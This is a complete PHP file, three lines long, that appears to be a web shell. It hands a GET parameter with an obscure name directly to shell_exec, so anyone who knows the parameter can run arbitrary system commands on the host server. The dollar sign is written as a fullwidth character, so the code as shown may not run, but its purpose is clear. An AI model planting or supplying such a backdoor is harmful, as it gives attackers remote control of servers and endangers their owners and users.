<?php
shell_exec(＄_GET['x05-CfrO']);
?>
